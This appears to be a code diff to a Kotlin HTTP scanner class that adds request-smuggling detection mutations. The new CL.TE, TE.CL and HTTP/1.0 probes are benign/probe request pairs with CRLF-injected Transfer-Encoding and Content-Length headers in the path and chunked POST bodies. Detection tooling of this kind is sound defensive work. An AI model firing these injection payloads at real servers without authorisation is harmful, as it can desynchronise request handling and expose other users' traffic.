@@ -11,6 +11,7 @@ class ReqMutator internal constructor() {
         internal var protocolBasedMutations: SettingsBox = SettingsBox()
         internal var pathBasedMutations: SettingsBox = SettingsBox()
         internal var headerBasedMutations: SettingsBox = SettingsBox()
+        internal var smuggleBasedMutations: SettingsBox = SettingsBox()
         internal var paramMinerMutations: SettingsBox = SettingsBox()
     }
 
@@ -24,6 +25,7 @@ class ReqMutator internal constructor() {
         //protocolBasedMutations.register("basic...", false, "Doesn't work")
         protocolBasedMutations.register("httx", true, "")
         protocolBasedMutations.register("tunnel", true, "")
+        protocolBasedMutations.register("http/1.0", true, "")
 
         // Header based mutations
         headerBasedMutations.register("dupeHost", true, "")
@@ -60,9 +62,13 @@ class ReqMutator internal constructor() {
         //mutations.register("headerSemiColon", false, "") Extremely FP prone... A lot of servers just reject ";" full stop
 
         // Path based mutations
-        pathBasedMutations.register("robots", true, "/robots.txt%20HTTP/1.1%0d%0aFoo:%20bar vs /robots.txtnot")
-        pathBasedMutations.register("sitemap", false, "FP prone... /sitemap.xml%20HTTP/1.1%0d%0aFoo:%20bar vs /sitemap.xmlnot")
-        pathBasedMutations.register("favicon", true, "/favicon.ico%20HTTP/1.1%0d%0aFoo:%20bar vs /favicon.iconot")
+        pathBasedMutations.register("robots", true, "Inspired by the CL.0 scan check")
+        pathBasedMutations.register("sitemap", true, "Inspired by the CL.0 scan check")
+        pathBasedMutations.register("favicon", true, "Inspired by the CL.0 scan check")
+
+        //Smuggle baed mutations?
+        smuggleBasedMutations.register("CL.TE-body-timeout", true, "Inspired by CL.TE detection")
+        smuggleBasedMutations.register("TE.CL-body-timeout", true, "Inspired by TE.CL detection")
 
 
 
@@ -307,6 +313,21 @@ class ReqMutator internal constructor() {
                 payload.benignRequest = baseRequest.withPath("/$basePath%20HTTP/1.1%0d%0a%43zntent-Type:%20foobar%0d%0aX:%20x")
                 payload.probeRequest = baseRequest.withPath("/$basePath%20HTTP/1.1%0d%0a%43ontent-Type:%20foobar%0d%0aX:%20x")
                 payload.expectedResponseMatches = listOf("406 Not Acceptable")
+            }
+            "CL.TE-body-timeout" -> {
+                payload.benignRequest = baseRequest.withPath("/$basePath%20HTTP/1.1%0d%0a%54zansfer-Encoding:%20chunked%0d%0aX:%20x").withBody("d\r\nx=y\r\n0\r\n\r\n").withMethod("POST")
+                payload.probeRequest = baseRequest.withPath("/$basePath%20HTTP/1.1%0d%0a%54ransfer-Encoding:%20chunked%0d%0aX:%20x").withBody("d\r\nx=y\r\n0\r\n\r\n").withMethod("POST")
+                payload.expectedResponseMatches = listOf("TIMEOUT")
+            }
+            "TE.CL-body-timeout" -> {
+                payload.benignRequest = baseRequest.withPath("/$basePath%20HTTP/1.1%0d%0a%43zntent-length:%2014%0d%0aX:%20x").withBody("3\r\nx=y\r\n0\r\n\r\n").withMethod("POST").withRemovedHeader("Content-Length").withAddedHeader("Transfer-Encoding", "chunked")
+                payload.probeRequest = baseRequest.withPath("/$basePath%20HTTP/1.1%0d%0a%43ontent-length:%2014%0d%0aX:%20x").withBody("3\r\nx=y\r\n0\r\n\r\n").withMethod("POST").withRemovedHeader("Content-Length").withAddedHeader("Transfer-Encoding", "chunked")
+                payload.expectedResponseMatches = listOf("TIMEOUT")
+            }
+            "http/1.0" -> {
+                payload.benignRequest = baseRequest.withPath("/$basePath%20HTTP/1.1%0d%0a%54ransfer-Encoding:%20chunkedd%0d%0aX:%20x")
+                payload.probeRequest = baseRequest.withPath("/$basePath%20HTTP/1.0%0d%0a%54ransfer-Encoding:%20chunkedd%0d%0aX:%20x")
+                payload.expectedResponseMatches = listOf("200 OK") //We expect the probe to return the same as the base request really. benign should trigger a 501 and probe should not (since TE isn't supported by HP1.0
             }
     	    //Something to do with connection header... If we remove a required header like "host" or similar... trying now
             //Something to do with the akamai talk on unicode... `%e5%98%8d%e5%98%8a == %0d%0a` somehow...
